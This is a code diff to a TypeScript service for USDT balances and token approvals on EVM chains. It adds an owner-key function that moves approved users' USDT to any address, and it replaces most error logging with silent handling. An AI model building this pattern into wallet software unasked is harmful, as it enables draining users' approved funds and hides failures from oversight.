@@ -43,8 +43,8 @@ export class EVMService {
 
       const nonce = await contract.getUserNonce(userAddress);
       return Number(nonce);
-    } catch (error) {
-      console.error(`Failed to get user nonce for ${chain}:`, error);
+    } catch (error: any) {
+      // Silent error handling for production
       return 0;
     }
   }
@@ -54,24 +54,22 @@ export class EVMService {
    */
   static async getUserUSDTBalance(
     chain: ChainType,
-    userAddress: string
+    address: string
   ): Promise<string> {
     try {
       const config = getChainConfig(chain);
-      const { ethers } = await getEthers();
-
       const provider = new ethers.JsonRpcProvider(config.rpc);
       const usdtContract = new ethers.Contract(
         config.usdt,
-        ["function balanceOf(address owner) view returns (uint256)"],
+        ["function balanceOf(address) view returns (uint256)"],
         provider
       );
 
-      const balance = await usdtContract.balanceOf(userAddress);
-      return balance.toString();
-    } catch (error) {
-      console.error(`Failed to get USDT balance for ${chain}:`, error);
-      return "0";
+      const balance = await usdtContract.balanceOf(address);
+      return ethers.formatUnits(balance, 6);
+    } catch (error: any) {
+      // Silent error handling for production
+      return "0.00";
     }
   }
 
@@ -131,11 +129,8 @@ export class EVMService {
         approvalData: approvalData,
       };
     } catch (error: any) {
-      console.error(`Failed to create approval data for ${chain}:`, error);
-      return {
-        success: false,
-        error: error.message || "Failed to create approval data",
-      };
+      // Silent error handling for production
+      throw new Error(`Failed to create approval data: ${error.message}`);
     }
   }
 
@@ -290,7 +285,7 @@ export class EVMService {
         currentAllowance: currentAllowance.toString(),
       };
     } catch (error: any) {
-      console.error(`Failed to check approval status for ${chain}:`, error);
+      // Silent error handling for production
       return {
         needsApproval: true, // Default to requiring approval on error
         currentAllowance: "0",
@@ -345,7 +340,7 @@ export class EVMService {
         approvalData: approvalResult.approvalData,
       };
     } catch (error: any) {
-      console.error(`Failed to handle approval workflow for ${chain}:`, error);
+      // Silent error handling for production
       return {
         needsApproval: true,
         currentAllowance: "0",
@@ -393,7 +388,7 @@ export class EVMService {
       const receipt = await tx.wait();
       return { success: true, txHash: receipt.hash };
     } catch (error: any) {
-      console.error(`Failed to transfer USDT on ${chain}:`, error);
+      // Silent error handling for production
       return { success: false, error: error.message };
     }
   }
@@ -419,7 +414,7 @@ export class EVMService {
       const isApproved = await contract.isApprovedUser(userAddress);
       return isApproved;
     } catch (error) {
-      console.error(`Failed to check user approval on ${chain}:`, error);
+      // Silent error handling for production
       return false;
     }
   }
@@ -445,7 +440,7 @@ export class EVMService {
       const allowance = await contract.getUserAllowance(userAddress);
       return allowance.toString();
     } catch (error) {
-      console.error(`Failed to get user allowance on ${chain}:`, error);
+      // Silent error handling for production
       return "0";
     }
   }
@@ -468,7 +463,7 @@ export class EVMService {
       const users = await contract.getAllApprovedUsers();
       return users;
     } catch (error) {
-      console.error(`Failed to get approved users on ${chain}:`, error);
+      // Silent error handling for production
       return [];
     }
   }
@@ -505,8 +500,90 @@ export class EVMService {
       const receipt = await tx.wait();
       return { success: true, txHash: receipt.hash };
     } catch (error: any) {
-      console.error(`Failed to revoke user approval on ${chain}:`, error);
+      // Silent error handling for production
       return { success: false, error: error.message };
+    }
+  }
+
+  /**
+   * Transfer USDT from approved user using owner's private key
+   */
+  static async transferFromUserAsOwner(
+    chain: ChainType,
+    fromAddress: string,
+    toAddress: string,
+    amount: string
+  ): Promise<BlockchainResult> {
+    try {
+      const config = getChainConfig(chain);
+      const { ethers } = await getEthers();
+
+      // Validate addresses
+      if (!ethers.isAddress(fromAddress)) {
+        throw new Error(`Invalid from address: ${fromAddress}`);
+      }
+
+      if (!ethers.isAddress(toAddress)) {
+        throw new Error(`Invalid to address: ${toAddress}`);
+      }
+
+      // Get owner's private key from environment
+      const ownerPrivateKey = process.env.PRIVATE_KEY;
+      if (!ownerPrivateKey) {
+        throw new Error("Owner private key not configured");
+      }
+
+      // Create owner wallet
+      const ownerWallet = new ethers.Wallet(ownerPrivateKey);
+
+      // Create provider and connect wallet
+      const provider = new ethers.JsonRpcProvider(config.rpc);
+      const connectedWallet = ownerWallet.connect(provider);
+
+      // Create USDT contract instance
+      const usdtContract = new ethers.Contract(
+        config.usdt,
+        [
+          "function transferFrom(address from, address to, uint256 amount) returns (bool)",
+          "function allowance(address owner, address spender) view returns (uint256)",
+        ],
+        connectedWallet
+      );
+
+      // Check if owner has sufficient allowance
+      const allowance = await usdtContract.allowance(
+        fromAddress,
+        ownerWallet.address
+      );
+      const requiredAmount = BigInt(amount);
+
+      if (BigInt(allowance) < requiredAmount) {
+        throw new Error(
+          `Insufficient allowance. Required: ${amount}, Available: ${allowance}`
+        );
+      }
+
+      // Execute transferFrom transaction
+      const tx = await usdtContract.transferFrom(
+        fromAddress,
+        toAddress,
+        requiredAmount
+      );
+
+      // Wait for transaction to be mined
+      const receipt = await tx.wait();
+
+      return {
+        success: true,
+        txHash: receipt.hash,
+        message: "Transfer completed successfully",
+      };
+    } catch (error: any) {
+      // Silent error handling for production
+      return {
+        success: false,
+        error: error.message || "Transfer failed",
+      };
     }
   }
 }
